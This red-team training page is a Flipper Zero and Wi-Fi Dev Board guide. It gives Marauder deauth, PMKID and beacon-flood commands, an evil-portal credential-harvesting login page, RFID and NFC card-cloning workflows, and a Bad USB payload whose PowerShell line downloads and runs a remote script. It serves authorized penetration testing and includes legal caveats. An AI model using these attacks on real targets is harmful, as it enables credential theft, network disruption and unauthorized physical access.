---
layout: training-page
title: "Flipper Zero & Wi-Fi Dev Board — Red Team Academy"
module: "Wireless Attacks"
tags:
  - flipper-zero
  - marauder
  - wifi-devboard
  - sub-ghz
  - rfid
  - nfc
  - bad-usb
  - deauth
  - evil-portal
page_key: "wireless-flipper-zero"
render_with_liquid: false
---

# Flipper Zero & Wi-Fi Dev Board

Flipper Zero is a portable multi-tool for signal research and physical pentesting. It consolidates Sub-GHz RF replay, 125 kHz RFID cloning, NFC emulation, IR replay, iButton, and Bad USB into one pocketable device. With the official Wi-Fi Dev Board (ESP32-S2) and Marauder firmware the platform gains active 802.11 attack capability: deauthentication, evil portals, PMKID capture, and beacon flood.

## Hardware Overview

```
Flipper Zero (base unit)
  Sub-GHz transceiver:  300–928 MHz (CC1101 chip)
  125 kHz RFID reader/emulator (EM4100, HID Prox, Indala, etc.)
  NFC:                  13.56 MHz ISO14443A/B, ISO15693, FeliCa (ST25R3916)
  Infrared:             TX (940 nm LED) + RX; RAW and protocol-based
  iButton (1-Wire):     Dallas DS1990A key cloning
  Bad USB:              USB HID — keyboard / mouse emulation (DuckyScript-like)
  GPIO pins:            8-pin header for dev board attachment
  Storage:              microSD card (FAT32; holds signal captures, payloads, NFC dumps)
  Firmware:             Open source — github.com/flipperdevices/flipperzero-firmware

Wi-Fi Dev Board (official)
  MCU:     ESP32-S2
  802.11:  b/g/n 2.4 GHz only
  Attaches via GPIO header (no soldering required)
  Default firmware: blackmagic debugger
  Attack firmware: Marauder (replaces blackmagic)
```

## Firmware Options

```
Stock firmware — flipperdevices/flipperzero-firmware
  Conservative; Sub-GHz TX limited to local regulations
  No EU/US frequency unlocking
  Safe for legal compliance

Unleashed firmware — DarkFlippers/Unleashed-Firmware
  Removes Sub-GHz frequency restrictions
  Adds extra Sub-GHz protocols (gate openers, older alarm keyfobs)
  Retains stock stability
  Install: flash .dfu or .tgz via qFlipper or web updater

RogueMaster firmware — RogueMaster/flipperzero-firmware-wPlugins
  Superset of Unleashed; includes experimental apps
  Integrated Marauder control from Flipper UI
  Larger install — less stable than Unleashed

Recommendation: Unleashed for stable extended RF range;
RogueMaster for integrated Wi-Fi attack menu
```

## Wi-Fi Dev Board — Marauder Firmware

```bash
# Install Marauder on the Wi-Fi Dev Board
# Method 1: Web flasher (easiest)
# 1. Attach Dev Board to Flipper GPIO
# 2. Connect Flipper to computer via USB
# 3. Navigate: mango.sesh.ae → "Install Marauder" → follow prompts

# Method 2: esptool
pip install esptool
esptool.py --port /dev/ttyACM0 --baud 921600 write_flash \
  0x0000  bootloader.bin \
  0x8000  partitions.bin \
  0xe000  boot_app0.bin \
  0x10000 esp32s2_marauder_v1.1.0_20240101_flipper.bin

# After flashing: navigate to Flipper GPIO app → Serial → 115200 baud
# Or control directly from Flipper Apps → GPIO → Marauder (RogueMaster firmware)
```

## Marauder — Wi-Fi Attack Commands

Marauder accepts commands over serial (USB or BLE). The Flipper GPIO serial app provides a terminal interface.

```
# Scan for SSIDs
scanap

# Scan for clients (STAs)
scansta

# List scanned results
list -a   (access points)
list -s   (stations/clients)

# Select target AP (index from list)
select -a 0

# Select target client
select -s 0

# Deauthentication attack
# Sends 802.11 deauth frames — boots clients off the AP
deauth -a    # deauth all clients from selected AP
deauth -s    # deauth specific selected station
deauth -c 0  # target AP index 0, all clients
stopscan     # stop any running attack

# Beacon spam — flood area with fake SSIDs
# Confuses Wi-Fi scanners; used for distraction during physical engagements
beacon -a    # spam random SSIDs
beacon -r    # spam SSIDs from a rickroll list (included)
beacon -l    # spam SSIDs from a custom ssids.txt on SD card

# PMKID capture (WPA2 handshake-adjacent)
# Captures PMKID from AP beacon/probe — no client required
# Requires: WPA2 AP that supports PMKID (most modern APs)
pmkid -a     # attempt PMKID capture from selected AP
# Output: PMKID hash saved to SD → transfer to PC for cracking
# Crack: hcxtools converts to hashcat format (-m 22000)

# Probe request sniffing — log what devices are searching for
# Reveals device history and preferred networks
sniffraw
# or
sniffbeacon
# Output logged to SD card as pcap

# Evil Portal — rogue AP with captive portal
# Hosts a fake Wi-Fi login page to capture credentials
evilportal -a "CorpGuest"    # spawn AP with SSID "CorpGuest"
# Victims connect; portal page served from SD card /MARAUDER/portals/
# Default portal: generic login form; customize HTML files on SD card

# Packet monitor — live frame counter by type
stopscan
monitor
```

## Evil Portal — Custom Credential Capture Page

```html
<!-- Save as /MARAUDER/portals/index.html on Flipper SD card -->
<!-- Mimics corporate guest Wi-Fi login -->
<!DOCTYPE html>
<html>
<head><title>Guest Network Login</title></head>
<body>
  <h2>Guest Wi-Fi — Please Sign In</h2>
  <form method="POST" action="/login">
    <label>Email: <input type="email" name="email" required></label><br>
    <label>Password: <input type="password" name="password" required></label><br>
    <input type="submit" value="Connect">
  </form>
</body>
</html>
```

```bash
# Marauder logs POST data to SD card at /MARAUDER/logs/
# After engagement: retrieve SD card, read logs/capture.log
# Credentials stored as: timestamp,email,password
```

## Sub-GHz Attacks

The CC1101 transceiver covers 300–928 MHz — the band used by most fixed-code remotes, garage doors, gate openers, and older wireless alarm sensors.

```
Common frequencies and targets:
  315 MHz  — US/Canada garage doors, car key fobs (older fixed-code)
  433.92 MHz — EU garage doors, alarm sensors, remote starts
  868 MHz  — EU IoT devices, alarm systems
  915 MHz  — US ISM band sensors, older key fobs

Attack workflow (fixed-code remotes):
  1. Apps → Sub-GHz → Read RAW
  2. Point Flipper at the target transmitter; press target button
  3. Flipper captures signal burst and saves as .sub file
  4. Apps → Sub-GHz → Saved → select file → Send
  5. Flipper retransmits the exact captured signal

Rolling code (KeeLoq, HiTag2) — replay alone doesn't work
  Modern car fobs and most post-2010 remotes use rolling codes
  Flipper captures but cannot crack rolling codes natively
  Use RollJam technique (separate hardware) for rolling code bypass
  See: wireless/sdr-attacks for RollJam implementation

Sub-GHz protocol analysis:
  Flipper can decode: AM270, AM650, FM238, FM476, CAME, Nice FLO,
  Ansonic, GateTX, Chamberlain KEELOQ, Faac SLH, Princeton, and more
  Unknown protocols: capture RAW → analyze with Universal Radio Hacker

Frequency unlock (Unleashed/RogueMaster):
  Enables TX outside default allowed bands (for lab / authorized use only)
  Settings → Frequency Analyzer → unlock full range
```

## 125 kHz RFID Cloning

```
Supported read/emulate protocols:
  EM4100 / EM4102  — most common proximity cards (blue/white fobs)
  HID Prox (HID 125 kHz) — corporate access cards
  Indala         — older Motorola/HID cards
  IO Prox        — Kantech format
  Paradox        — alarm system badges
  Viking         — elevator key fobs

Read workflow:
  Apps → 125 kHz RFID → Read
  Hold Flipper against the card/fob (within ~3 cm)
  Flipper displays card type + UID when read succeeds
  Save with name (stored as .rfid on SD card)

Emulate (cloned card):
  Apps → 125 kHz RFID → Saved → select → Emulate
  Hold Flipper against reader — reader sees the cloned UID
  Range: ~3–5 cm; same as original card

Write to T5577 blank:
  T5577 is a writable RFID tag (available on AliExpress, ~$0.50/card)
  Apps → 125 kHz RFID → Saved → select → Write to T5577
  Creates a physical cloned card — no Flipper needed for entry
  T5577 writes EM4100, HID Prox, Indala formats

Limitations:
  Cannot read/write iClass (13.56 MHz HID — different radio)
  Cannot read/write DESFire / MIFARE DESFire (encrypted NFC)
  Some corporate readers verify sector data beyond UID — cloning UID alone may not work
```

## NFC Attacks (13.56 MHz)

```
Supported protocols:
  MIFARE Classic 1K / 4K — parking meters, transit cards, hotel keys, locker access
  MIFARE Ultralight      — disposable transit tickets
  MIFARE DESFire (read UID only — data is encrypted/authenticated)
  ISO14443A/B            — generic smartcards
  NFC-A/B/V/F (FeliCa)  — Japan transit cards

MIFARE Classic read workflow:
  Apps → NFC → Read
  Flipper performs dictionary attack with built-in key set (nested auth)
  Cards with default keys (0xFFFFFFFFFFFF, 0xA0A1A2A3A4A5, etc.)
  are usually read fully in <30 seconds
  Saves as .nfc file on SD card containing all sectors

Emulate cloned card:
  NFC → Saved → select → Emulate
  Flipper emulates the card UID and sector data
  Works for parking/gym access that only checks UID
  Cards with MAC validation / server-side checks will fail

MIFARE mfoc attack (advanced — not on Flipper):
  If Flipper's built-in dictionary fails, use a PC:
  # Install: apt install mfoc mfcuk
  # mfoc -O card.mfd    # nested authentication key recovery
  # mfcuk -C -R 0:A:... # darkside attack for completely unknown keys
  # Transfer .mfd back to SD card for Flipper emulation

Hotel key analysis:
  Most hotel systems use MIFARE Classic with proprietary encoding
  Flipper reads and saves the raw dump
  Analyze with: libnfc + mfoc on PC or MIFARE Classic Tool (Android)
  Some systems re-encode on checkout — cloned key may stop working
```

## Bad USB (HID Injection)

Flipper acts as a USB HID keyboard — identical in concept to the USB Rubber Ducky. Payloads are written in a DuckyScript-compatible format.

```
Payload file format (.txt stored in /badusb/ on SD card):

REM Open PowerShell and download reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
ENTER

Keys supported: ALT, CTRL, SHIFT, GUI, ENTER, DELAY, STRING, REM,
  CAPSLOCK, NUMLOCK, SCROLLLOCK, all F-keys, arrow keys, special chars

Run payload:
  Apps → Bad USB → select payload → Run
  Plug Flipper into target USB port
  Payload executes immediately on connect (or after DELAY)

Limitations vs O.MG Elite:
  No Wi-Fi exfiltration — Flipper Bad USB is fire-and-forget USB only
  No remote triggering without Wi-Fi Dev Board (separate app needed)
  Keystroke injection speed: adequate but slower than RubberDucky V3
  No multi-stage payload downloads without network connectivity

Combining with Wi-Fi Dev Board:
  Stage 1: Bad USB → opens PowerShell, downloads payload from local server
  Stage 2: Marauder evil portal → running on same Flipper, harvests credentials
  Flipper can run Bad USB and Wi-Fi attacks simultaneously
```

## Infrared Replay

```
Flipper includes an IR TX LED and IR RX sensor (NEC, Samsung, Sony, RC5, RC6, RAW)

Universal remotes database:
  Flipper ships with TV/projector/AC IR libraries (~80+ brands)
  Apps → Infrared → Universal Remotes → TV/AC/Projector/etc.
  One-button off/on — useful for physical engagement distractions

Capture custom signals:
  Apps → Infrared → Learn New Remote
  Point target remote at Flipper; press button
  Flipper captures and decodes (or stores as RAW)
  Save → Emulate for replay

Physical attack scenarios:
  Disable conference room AV during a presentation (distraction)
  Unlock server room IR-controlled access panels (rare but exists)
  Disable PIR motion sensors that respond to IR commands (rare)
```

## iButton (Dallas Key)

```
iButton = Dallas/Maxim 1-Wire key (metal contact token, common in Eastern Europe)
Flipper reads: DS1990A, DS1992, DS1996, DS2002, DS2004, CYFral, Metacom, Elfin

Read:
  Apps → iButton → Read
  Touch the metal token to Flipper's iButton port (bottom contact)
  Saves key ID as .ibtn file

Emulate:
  iButton → Saved → select → Emulate
  Touch Flipper's iButton port to the reader — behaves like the original key

Write to writable key:
  Compatible with RW1990 and similar writable tokens
  iButton → Saved → select → Write
```

## Operational Notes

```
Detection surface:
  Sub-GHz replay: RF energy is detectable by spectrum analyzers; brief burst
  Deauth attacks: logged by enterprise Wi-Fi controllers (Cisco, Aruba)
    — shows as repeated deauth frames from a spoofed BSSID in RF logs
  Evil portal: visible as a new SSID in Wi-Fi surveys
  RFID read: passive read is undetectable; emulation logs card event on reader
  Bad USB: Windows Event Log 4688 (process creation), PowerShell event logs

Engagement use cases:
  Physical access simulation: RFID clone → test door access controls
  Wireless coverage test: beacon flood → demonstrate lack of rogue AP detection
  Credential harvest demo: evil portal → show SSID spoofing risk on guest networks
  IT distraction: deauth attack → drop devices to demonstrate wireless DoS risk
  Keylogger/implant delivery: Bad USB → demonstrate USB policy gaps

Legal / authorized use only:
  Sub-GHz TX outside allocated bands requires spectrum authority license
  Deauth attacks disrupt legitimate traffic — use only in isolated lab or scoped engagement
  RFID cloning of access cards requires explicit written authorization
  Evil portal credential capture requires authorization — collecting credentials without consent is illegal
```

## Resources

- Flipper Zero firmware — `github.com/flipperdevices/flipperzero-firmware`
- Unleashed firmware — `github.com/DarkFlippers/unleashed-firmware`
- RogueMaster firmware — `github.com/RogueMaster/flipperzero-firmware-wPlugins`
- Marauder firmware — `github.com/justcallmekoko/ESP32Marauder`
- Marauder wiki — `github.com/justcallmekoko/ESP32Marauder/wiki`
- Flipper Bad USB payloads — `github.com/UberGuidoZ/Flipper`
- Flipper RFID research — `github.com/RfidResearchGroup/proxmark3` (for advanced analysis)
- Wi-Fi Dev Board web flasher — `mango.sesh.ae`
